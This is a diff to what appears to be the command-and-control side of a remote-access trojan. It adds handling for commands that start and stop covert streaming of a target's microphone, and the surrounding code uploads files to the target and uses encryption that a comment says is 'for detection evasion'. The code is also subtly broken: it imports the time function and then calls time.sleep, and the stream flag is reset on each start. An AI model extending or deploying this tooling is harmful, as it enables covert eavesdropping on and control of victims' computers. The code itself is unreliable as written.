@@ -9,6 +9,7 @@ import json  # JSON is used for encoding and decoding data in a structured forma
 import os  # This library allows interaction with the operating system.
 import ctypes
 from ctypes import c_char_p, c_int, CFUNCTYPE
+from time import time
 import pyaudio
 import threading
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
@@ -129,13 +130,18 @@ def target_communication():
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
         elif command == 'listening_start':
+            time.sleep(2)  # Ensure the target is ready for audio streaming
             stream_flag = {'on': False}
             if not stream_flag['on']:
                 stream_flag['on'] = True
                 audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
                 audio_thread.start()
+            result = reliable_recv()
+            print(result)
         elif command == 'listening_stop':
             stream_flag['on'] = False
+            result = reliable_recv()
+            print(result)
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
